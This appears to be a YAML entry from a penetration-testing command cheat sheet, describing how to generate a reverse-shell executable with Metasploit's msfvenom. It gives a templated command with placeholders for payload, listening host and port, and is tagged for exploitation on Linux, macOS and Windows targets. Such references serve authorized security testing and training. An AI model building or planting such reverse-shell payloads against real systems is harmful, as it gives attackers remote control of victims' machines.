---
description: |
  Metasploit way to generate a reverse shell.

  Command Reference:

    Payload: The payload to generate, such as "linux/x64/shell_reverse_tcp"

    Listening Host: Your machine, used to listen for incoming connections

    Listening Port: Port on which you are listening for connections

    Format: Executable format, like "elf" (not always needed)

    Output file: Executable to run on target (Executable type is set with -f (format))

command: |
  msfvenom -p <payload> lhost=<listening_host> lport=<listening_port> -f <format> -o <output_file>
  
items:
  - Shell
  
target: |
  - Linux_target
  - MacOS_target
  - Windows_target
  
OS:
  - Linux
  - MacOS
  
environment: |
  - Networking
  - Local
  
command_types:
  - Exploitation
  - Reverse_Shell
  
references:

---
